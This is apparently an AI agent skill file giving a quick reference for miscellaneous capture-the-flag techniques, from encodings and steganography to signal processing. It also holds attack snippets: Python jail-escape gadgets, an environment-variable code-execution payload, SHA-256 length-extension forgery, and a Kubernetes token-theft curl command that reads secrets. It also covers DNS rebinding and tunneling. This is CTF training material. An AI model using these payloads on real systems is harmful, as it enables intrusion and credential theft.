---
name: ctf-misc
description: Miscellaneous CTF challenge techniques. Use for encoding puzzles, RF/SDR signal processing, Python/bash jails, DNS exploitation, unicode steganography, floating-point tricks, or challenges that don't fit other categories.
license: MIT
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF Miscellaneous

Quick reference for miscellaneous CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Additional Resources

- [pyjails.md](pyjails.md) - Python jail/sandbox escape techniques
- [bashjails.md](bashjails.md) - Bash jail/restricted shell escape techniques
- [encodings.md](encodings.md) - Encodings, QR codes, audio, esolangs, SHA-256 length extension, UTF-16 tricks
- [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ signal processing (QAM-16, carrier recovery, timing sync)
- [dns.md](dns.md) - DNS exploitation (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling)
- [games-and-vms.md](games-and-vms.md) - WASM patching, PyInstaller, marshal, Python env RCE, Z3, K8s RBAC

---

## General Tips

- Read all provided files carefully
- Check file metadata, hidden content, encoding
- Power Automate scripts may hide API calls
- Use binary search when guessing multiple answers

## Common Encodings

```bash
# Base64
echo "encoded" | base64 -d

# Base32 (A-Z2-7=)
echo "OBUWG32D..." | base32 -d

# Hex
echo "68656c6c6f" | xxd -r -p

# ROT13
echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**Identify by charset:**
- Base64: `A-Za-z0-9+/=`
- Base32: `A-Z2-7=` (no lowercase)
- Hex: `0-9a-fA-F`

See [encodings.md](encodings.md) for Caesar brute force, URL encoding, and full details.

## IEEE-754 Float Encoding (Data Hiding)

**Pattern (Floating):** Numbers are float32 values hiding raw bytes.

**Key insight:** A 32-bit float is just 4 bytes interpreted as a number. Reinterpret as raw bytes -> ASCII.

```python
import struct
floats = [1.234e5, -3.456e-7, ...]  # Whatever the challenge gives
flag = b''
for f in floats:
    flag += struct.pack('>f', f)
print(flag.decode())
```

**Variations:** Double `'>d'`, little-endian `'<f'`, mixed. See [encodings.md](encodings.md) for CyberChef recipe.

## USB Mouse PCAP Reconstruction

**Pattern (Hunt and Peck):** USB HID mouse traffic captures on-screen keyboard typing.

**Workflow:**
1. Open PCAP in Wireshark -- identify USBPcap with HID interrupt transfers
2. Identify device (Device Descriptor -> manufacturer/product)
3. Use USB-Mouse-Pcap-Visualizer: `github.com/WangYihang/USB-Mouse-Pcap-Visualizer`
4. Extract click coordinates (falling edges of `left_button_holding`)
5. Plot clicks on scatter plot with matplotlib
6. Overlay on image of Windows On-Screen Keyboard
7. Animate clicks in order to read typed text

**Key details:**
- Mouse reports **relative** coordinates (deltas), not absolute
- Cumulative sum of deltas gives position track
- Rising/falling edges of button state = click start/end
- Need to scale/stretch overlay to match OSK layout

```python
import pandas as pd
import matplotlib.pyplot as plt

df = pd.read_csv('mouse_data.csv')
# Find click positions (falling edges)
clicks = df[df['left_button_holding'].shift(1) == True & (df['left_button_holding'] == False)]
# Cumulative position from relative deltas
x_pos = df['x'].cumsum()
y_pos = df['y'].cumsum()
# Plot clicks over OSK image
plt.scatter(click_x, click_y, c='red', s=50)
```

## File Type Detection

```bash
file unknown_file
xxd unknown_file | head
binwalk unknown_file
```

## Archive Extraction

```bash
7z x archive.7z           # Universal
tar -xzf archive.tar.gz   # Gzip
tar -xjf archive.tar.bz2  # Bzip2
tar -xJf archive.tar.xz   # XZ
```

### Nested Archive Script
```bash
while f=$(ls *.tar* *.gz *.bz2 *.xz *.zip *.7z 2>/dev/null|head -1) && [ -n "$f" ]; do
    7z x -y "$f" && rm "$f"
done
```

## QR Codes

```bash
zbarimg qrcode.png       # Decode
qrencode -o out.png "data"
```

See [encodings.md](encodings.md) for QR structure, repair techniques, and chunk reassembly.

## Audio Challenges

```bash
sox audio.wav -n spectrogram  # Visual data
qsstv                          # SSTV decoder
```

## RF / SDR / IQ Signal Processing

See [rf-sdr.md](rf-sdr.md) for full details (IQ formats, QAM-16 demod, carrier/timing recovery).

**Quick reference:**
- **cf32**: `np.fromfile(path, dtype=np.complex64)` | **cs16**: int16 reshape(-1,2) | **cu8**: RTL-SDR raw
- Circles in constellation = frequency offset; Spirals = offset + time-varying phase
- 4-fold ambiguity in DD carrier recovery - try 0/90/180/270 rotation

## pwntools Interaction

```python
from pwn import *

r = remote('host', port)
r.recvuntil(b'prompt: ')
r.sendline(b'answer')
r.interactive()
```

## Python Jail Quick Reference

**Enumerate functions:**
```python
for c in string.printable:
    result = test(f"{c}()")
    if "error" not in result.lower():
        print(f"Found: {c}()")
```

**Oracle pattern (L, Q, S functions):**
```python
flag_len = int(test("L()"))
for i in range(flag_len):
    for c in range(32, 127):
        if query(i, c) == 0:
            flag += chr(c)
            break
```

**Bypass character restrictions:**
```python
# Walrus operator
(abcdef := "new_allowed_chars")

# Octal escapes
'\141' = 'a'
```

**Decorator bypass (ast.Call banned, no quotes, no `=`):**
```python
# Decorators = function calls + assignment without ast.Call or =
# function.__name__ = strings without quotes
# See pyjails.md "Decorator-Based Escape" for full technique
@__import__
@func.__class__.__dict__[__name__.__name__].__get__  # name extractor
def os():
    0
# Result: os = __import__("os")
```

**String join bypass (`+` blocked):** `open(''.join(['fl','ag.txt'])).read()` -- see [pyjails.md](pyjails.md) for more.

## Z3 Constraint Solving

```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
s.add(flag[0] == ord('f'))  # Known prefix
# Add constraints...
if s.check() == sat:
    print(bytes([s.model()[f].as_long() for f in flag]))
```

See [games-and-vms.md](games-and-vms.md) for YARA rules with Z3 and type systems as constraints.

## Hash Identification

**By constants:**
- MD5: `0x67452301`
- SHA-256: `0x6a09e667`
- MurmurHash64A: `0xC6A4A7935BD1E995`

## SHA-256 Length Extension Attack

**Pattern:** MAC = `SHA-256(SECRET || message)` with known message and hash. Forge valid MAC without knowing SECRET.

```python
import hlextend
sha = hlextend.new('sha256')
new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
new_hash = sha.hexdigest()
```

Vulnerable: SHA-256, MD5, SHA-1. NOT vulnerable: HMAC, SHA-3. See [encodings.md](encodings.md) for full attack steps.

## PyInstaller Extraction

```bash
python pyinstxtractor.py packed.exe
# Look in packed.exe_extracted/
```

See [games-and-vms.md](games-and-vms.md) for opcode remapping and marshal analysis.

## Marshal Code Analysis

```python
import marshal, dis
with open('file.bin', 'rb') as f:
    code = marshal.load(f)
dis.dis(code)
```

## Python Environment RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

See [games-and-vms.md](games-and-vms.md) for other dangerous env vars and full explanation.

## WASM Game Exploitation via Patching

**Pattern:** Game with unbeatable AI in WASM. Patch minimax to play badly, proofs still validate.

```bash
wasm2wat main.wasm -o main.wat
# Flip bestScore init and comparison operator
wat2wasm main.wat -o main_patched.wasm
```

See [games-and-vms.md](games-and-vms.md) for full exploitation code and JS integration.

## Floating-Point Precision Exploitation

**Pattern (Spare Me Some Change):** Trading/economy games where large multipliers amplify tiny floating-point errors.

**Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.

### Finding Exploitable Values
```python
mult = 1000000000000000  # 10^15

# Find values where multiplication creates useful fractional errors
for i in range(1, 100):
    x = i / 100.0
    result = x * mult
    frac = result - int(result)
    if frac > 0:
        print(f'x={x}: {result} (fraction={frac})')

# Common values with positive fractions:
# 0.07 -> 70000000000000.0078125
# 0.14 -> 140000000000000.015625
# 0.27 -> 270000000000000.03125
# 0.56 -> 560000000000000.0625
```

### Exploitation Strategy
1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
2. **Find favorable FP error**: Value where `x * mult` has positive fraction
3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"

**Example (time-travel trading game):**
```
Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
Multiplier: 1e15 (time travel)

# Buy 0.56, travel through time:
balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
inventory = 0.56 * 1e15 = 560000000000000.0625

# Sell exactly 560000000000000 (integer part):
balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee

# Now: balance >= flag_price AND inventory >= fee
```

### Why It Works
- Float64 has ~15-16 significant digits precision
- `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
- `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
- The asymmetric rounding gives you slightly more total value than you started with

### Red Flags in Challenges
- "Time travel amplifies everything" (large multipliers)
- Trading games with buy/sell + special actions
- Decimal currency with fees or thresholds
- "No decimals allowed" after certain operations (forces integer transactions)
- Starting values that seem impossible to win with normal math

### Quick Test Script
```python
def find_exploit(mult, balance_needed, inventory_needed):
    """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
    for i in range(1, 500):
        x = i / 100.0
        if x >= 5.0:  # Can't buy more than balance
            break
        inv_after = x * mult
        bal_after = (5.0 - x) * mult

        # Sell integer part of inventory
        sell = int(inv_after)
        final_bal = bal_after + sell
        final_inv = inv_after - sell

        if final_bal >= balance_needed and final_inv >= inventory_needed:
            print(f'EXPLOIT: buy {x}, sell {sell}')
            print(f'  final_balance={final_bal}, final_inventory={final_inv}')
            return x
    return None

# Example usage:
find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
```

## Kubernetes RBAC Bypass

**Pattern (CTFaaS):** Container deployer with claimed ServiceAccount isolation.

**Attack chain:** Deploy probe -> read SA token -> impersonate deployer -> hostPath mount -> extract kubeconfig -> read secrets.

```bash
# From inside pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
```

See [games-and-vms.md](games-and-vms.md) for full attack chain and K8s privilege escalation checklist.

## 3D Printer Video Nozzle Tracking (LACTF 2026)

**Pattern (flag-irl):** Video of 3D printer fabricating nameplate. Flag is the printed text.

**Technique:** Track nozzle X/Y positions from video frames, filter for print moves (top/text layer only), plot 2D histogram to reveal letter shapes:
```python
# 1. Identify text layer frames (e.g., frames 26100-28350)
# 2. Track print head X position (physical X-axis)
# 3. Track bed X position (physical Y-axis from camera angle)
# 4. Filter for moves with extrusion (head moving while printing)
# 5. Plot as 2D scatter/histogram -> letters appear
```

## Useful One-Liners

```bash
grep -rn "flag{" .
strings file | grep -i flag
python3 -c "print(int('deadbeef', 16))"
```

## Keyboard Shift Cipher

**Pattern (Frenzy):** Characters shifted left/right on QWERTY keyboard layout.

**Identification:** dCode Cipher Identifier suggests "Keyboard Shift Cipher"

**Decoding:** Use [dCode Keyboard Shift Cipher](https://www.dcode.fr/keyboard-shift-cipher) with automatic mode.

## Pigpen / Masonic Cipher

**Pattern (Working For Peanuts):** Geometric symbols representing letters based on grid positions.

**Identification:** Angular/geometric symbols, challenge references "Peanuts" comic (Charlie Brown), "dusty looking crypto"

**Decoding:** Map symbols to Pigpen grid positions, or use online decoder.

## ASCII in Numeric Data Columns

**Pattern (Cooked Books):** CSV/spreadsheet numeric values (48-126) are ASCII character codes.

```python
import csv
with open('data.csv') as f:
    reader = csv.DictReader(f)
    flag = ''.join(chr(int(row['Times Borrowed'])) for row in reader)
print(flag)
```

**CyberChef:** "From Decimal" recipe with line feed delimiter.

## Backdoor Detection in Source Code

**Pattern (Rear Hatch):** Hidden command prefix triggers `system()` call.

**Common patterns:**
- `strncmp(input, "exec:", 5)` -> runs `system(input + 5)`
- Hex-encoded comparison strings: `\x65\x78\x65\x63\x3a` = "exec:"
- Hidden conditions in maintenance/admin functions

## DNS Exploitation Techniques

See [dns.md](dns.md) for full details (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling).

**Quick reference:**
- **ECS spoofing**: `dig @server flag.example.com TXT +subnet=10.13.37.1/24` - try leet-speak IPs (1337)
- **NSEC walking**: Follow NSEC chain to enumerate DNSSEC zones
- **IXFR**: `dig @server domain IXFR=0` when AXFR is blocked
- **DNS rebinding**: Low-TTL alternating resolution to bypass same-origin
- **DNS tunneling**: Data exfiltrated via subdomain queries or TXT responses

## Unicode Steganography

### Variation Selectors (U+FE00-U+FE0F)
**Pattern (Seen, Nullcon 2026):** Zero-width variation selectors carry data through codepoint values.

```python
# Extract hidden data from variation selectors after visible emoji
data = open('README.md', 'r').read().strip()
hidden = data[1:]  # Skip visible emoji character
flag = ''.join(chr((ord(c) - 0xE0100) + 16) for c in hidden)
```

### Variation Selectors Supplement (U+E0100-U+E01EF)
**Pattern (emoji, Nullcon 2026):** Characters from Variation Selectors Supplement encode ASCII.

```python
# Formula: ASCII value = (codepoint - 0xE0100) + 16
flag = ''
for c in hidden_chars:
    val = (ord(c) - 0xE0100) + 16
    flag += chr(val)
```

**Detection:** Characters appear invisible but have non-zero length. Check with `[hex(ord(c)) for c in text]` -- look for codepoints in `0xE0100-0xE01EF` or `0xFE00-0xFE0F` range.

## UTF-16 Endianness Reversal

**Pattern (endians):** Text "turned to Japanese" -- mojibake from UTF-16 endianness mismatch.

```python
# If encoded as UTF-16-LE but decoded as UTF-16-BE:
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
```

**Identification:** CJK characters, challenge mentions "translation" or "endian". See [encodings.md](encodings.md) for details.

## Cipher Identification Workflow

1. **ROT13** - Challenge mentions "ROT", text looks like garbled English
2. **Base64** - `A-Za-z0-9+/=`, title hints "64"
3. **Base32** - `A-Z2-7=` uppercase only
4. **Atbash** - Title hints (Abash/Atbash), preserves spaces, 1:1 substitution
5. **Pigpen** - Geometric symbols on grid
6. **Keyboard Shift** - Text looks like adjacent keys pressed
7. **Substitution** - Frequency analysis applicable

**Auto-identify:** [dCode Cipher Identifier](https://www.dcode.fr/cipher-identifier)
